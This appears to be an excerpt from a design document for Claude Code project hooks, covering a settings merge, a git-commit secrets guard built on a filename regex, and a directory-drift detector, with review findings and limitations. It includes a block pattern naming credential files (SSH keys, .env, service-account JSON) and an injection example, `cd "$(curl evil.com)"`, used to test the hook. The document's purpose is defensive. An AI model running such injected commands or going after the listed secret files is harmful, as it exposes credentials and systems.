...
4. If `.claude/settings.json` already exists in the project, read it first and **merge** — add this hook under `hooks.SessionStart`, don't overwrite any existing hooks/settings. If a SessionStart hook already exists with a similar doc-loading command, ask the user whether to replace or keep both rather than silently duplicating.
   ...
   **Check the existing shape of `hooks.SessionStart` before merging — don't assume it's already an array.** A fifth fresh-eyes review (Session 17) found that the naive merge an agent would reach for, `jq '.hooks.SessionStart += [newEntry]'`, hard-fails with `jq: error: object and array cannot be added` if `hooks.SessionStart` already exists as a bare object (e.g. `{"command": "..."}` — an older/non-standard shape, or something hand-written) rather than the array Claude Code's schema actually expects. Reproduced directly: this is a real `jq` exit-5 error that would block the entire hook-install step on a plausible existing-project file, not a synthetic edge case. Use a type-checked merge instead of a bare `+=`:
   ```bash
   ...
   ```
   Verified against all four plausible starting shapes: existing array (appends correctly), bare-object `SessionStart` (wraps the old entry into an array alongside the new one, preserving it rather than dropping it), no `hooks` key at all, and no `SessionStart` key under an existing `hooks` object with other events — all four produce valid, schema-correct output with no data loss.
...
2. Build a `PreToolUse` hook matching `Bash`, with an `if` filter scoped to `git commit` invocations, that checks staged files against a forbidden pattern.
   ...
   **A second external review pass (Session 13) found further real gaps**, by deliberately probing filenames *not* already in the fixture set rather than just re-checking existing cases — the pattern above enumerates known-bad name *patterns*, so it is structurally always going to miss leak vectors no one has thought to add yet. The gaps found and fixed: `config.json` (JSON, not just YAML, config files), `service-account.json`-style GCP credential filenames (no "secret"/"credential" substring at all — one of the most common real-world leak vectors), bare-name SSH private keys (`id_rsa`, `id_ed25519`, etc. — no `.pem`/`.key` extension), Terraform `.tfstate`/`.tfvars` files (routinely contain plaintext secrets), `.npmrc` (frequently holds an npm auth token), and `.pfx` cert bundles. The current full pattern:
   ```bash
   STAGED=$(git diff --cached --name-only)
   FORBIDDEN=$(echo "$STAGED" | grep -vE '(^|/)\.env\.example$' | grep -iE '(^|/)\.env(\.[^/]*)?$|\.pem(\.[^/]*)?$|\.key(\.[^/]*)?$|(^|/)config[^/]*\.ya?ml(\.[^/]*)?$|(^|/)config/.*\.ya?ml(\.[^/]*)?$|(^|/)config[^/]*\.json$|(^|/)config/.*\.json$|(^|[/_.-])secrets?([_.-]|$)|(^|[/_.-])credentials?([_.-]|$)|(^|[/_.-])service[_-]?account[_-]?.*\.json$|(^|/)id_(rsa|dsa|ecdsa|ed25519)$|\.tfstate(\.[^/]*)?$|\.tfvars$|(^|/)\.npmrc$|\.pfx$')
   if [ -n "$FORBIDDEN" ]; then echo "BLOCKED: forbidden files staged: $FORBIDDEN"; exit 1; fi
   ```
   Note `id_rsa`/`id_ed25519` etc. deliberately match only the bare private-key name, not `.pub` — the public-key counterpart (`id_rsa.pub`) is meant to be shared and committing it is not a leak; the pattern was specifically checked against this to avoid a false positive.

   Given this pattern is fundamentally an enumeration of known leak vectors rather than a content-based scanner, treat it as inherently incomplete by nature, not just incomplete-for-now — see `foundry-security/SKILL.md`'s "What this skill does NOT do" for the structural reason a real content scanner (gitleaks/trufflehog) is the actual fix for this class of gap, not an ever-growing filename list. Periodically probing the pattern with realistic filenames *not yet in the fixture set* (the same technique that found this round of gaps) is more valuable than only re-running the existing fixture file, which by construction can never catch a case nobody thought to add.
...
**Session 16 found and fixed a real, user-visible bug** via a fourth fresh-eyes review pass: a missing or empty `scaffoldedDate` (a real reachable state — a future bug or a hand-edit could set `scaffolded` without `scaffoldedDate`) rendered the visibly broken message `"Foundry: Active (scaffolded )"` — trailing space, empty parens. Fixed: `DATE` now defaults to the literal string `"an unknown date"` whenever `jq` returns empty (missing field, empty string, or extraction failure), reusing the same `[ -z ... ] && VAR=default` guard for `SCAFFOLDED`/`DISMISSED` too, which closes a related latent gap (an empty-string extraction previously fell through to an unintended empty-string variable value rather than the literal `"false"`, which happened to compare false anyway but wasn't the value it looked like). Re-verified against 9 cases on the real, JSON-embedded command: empty file, missing date, empty-string date, normal case, dismissed, neither, malformed JSON, top-level array, and a JSON-string `"true"` instead of boolean `true`.

**Two related findings from the same review were judged out of scope, not silently dropped:**
- **No type distinction between a JSON string `"true"` and a JSON boolean `true`** for `foundry.scaffolded`/`foundry.dismissed`. `jq -r` stringifies both identically before the value ever reaches bash's `[ = "true" ]` comparison, so they're genuinely indistinguishable downstream without an extra `jq -e 'type == "boolean"'` check. Judged not worth the added complexity (a second `jq` call and failure branch) for what's fundamentally a hand-edit-typo scenario — and arguably correct behavior anyway, since a user hand-editing these flags probably means `"true"` the same way they mean `true`.
- **A self-contradictory state (`scaffolded: true` AND `dismissed: true` simultaneously) is silently resolved by checking `scaffolded` first**, with nothing flagging that the underlying state is inconsistent. Accepted as a reasonable tiebreak (these fields are only ever written by `foundry-init`/the dismiss flow, which don't produce this combination under normal operation) rather than adding validation logic for a state that shouldn't arise outside a hand-edit.
- **No `jq`-not-installed detection.** If `jq` is missing from `PATH`, every extraction silently degrades to the empty/default value, producing the "not set up" offer message with no indication the real cause is a missing dependency rather than an actual project state. `jq` is a hard, undocumented prerequisite for every Foundry hook (Hooks 1, 2, 3, 4 all use it) — not just this one — so fixing this hook alone wouldn't close the real gap. Tracked in README.md's Roadmap as "document `jq` as a hard prerequisite" rather than patched locally here.
...
2. Merge into `.claude/settings.json` under `hooks.SessionStart` as a **separate array entry** alongside Hook 1 (confirmed: multiple `SessionStart` entries coexist correctly in the same array — don't try to combine them into one hook's command). Use the same type-checked merge from Hook 1 step 4 — the bare-object-`SessionStart` failure mode applies here identically, since this is the same merge target.
...
**Steps:**
1. Build a `PreToolUse` hook matching `Bash`, command:
   ```bash
   ...
   **Session 14 extended this command** after a third external review pass (the same probing technique Session 13 used on the secrets-guard regex, pointed at this hook instead) found three real, silent false-negative gaps beyond the two already-documented limitations: `pushd /path` wasn't detected at all (the regex only matched a literal leading `cd`); `cd -- /path` (the POSIX end-of-options separator) got captured as part of the target string, so the subsequent `cd "$TARGET"` failed to resolve; and `cd "$HOME/Projects/x"` got captured with `$HOME` unexpanded for the same reason. All three independently reproduced before fixing. The fix: the regex now also matches a leading `pushd`, strips a `--` separator if present, strips one layer of surrounding single- or double-quotes, and does a **literal, non-evaluating** substitution of `~` and `$HOME` specifically (via bash parameter expansion, not `eval`) — deliberately not a general shell-variable-expansion or command-substitution engine. That scope boundary is a deliberate security decision, not laziness: a captured target like `cd "$(curl evil.com)"` must never be evaluated by this hook, since the hook only sees text already substituted into a `tool_input.command` string — evaluating it again would mean re-executing arbitrary captured command substitution. Confirmed directly: the fixed command correctly stays silent (does not execute `curl`) on that exact input, treating the literal string `$(curl evil.com)` as a (non-existent, non-resolving) path. Re-tested every original case plus all three new ones plus adversarial lookalikes (`pushd_helper.sh /path`, `cd_helper /path`, `echo pushd /path` — none of which should match, and don't) before trusting this version.
2. **Known, real limitations — state plainly, don't oversell this as comprehensive:**
   - Only catches `cd`/`pushd` as the **first** token of a command. Either appearing later in a chain (e.g. `echo hello; cd ~/other-project`) is not detected — confirmed via direct test, not assumed.
   ...
   - Only `~` and `$HOME` are expanded, and only as a literal string substitution. Any other environment variable (`$PROJECT_ROOT`, `$WORKDIR`, etc.) or command substitution in the target path is **not** expanded and will simply fail to resolve, causing the hook to stay silent on real drift. This is a deliberate scope boundary, not an oversight: expanding arbitrary shell constructs would require evaluating attacker- or caller-influenced text, which is a real injection risk for a hook that runs on every Bash command — see step 1 above for the specific case (`$(...)` command substitution) this protects against.
3. Validate before writing: pipe-test with synthetic stdin (`echo '{"tool_input":{"command":"cd ~/Projects/other && ls"}}' | bash -c "<command>"`) confirming it appends to `.claude/drift.log` for a real cross-project path and stays silent for a same-project path. There is no committed fixture suite for this hook yet (unlike the secrets-guard regex and `.gitignore` baseline) — it doesn't fit `tests/run_fixtures.sh`'s shape, since it parses a command string rather than matching a static filename list. Treat that as known debt (see README.md Roadmap), not as "already covered."
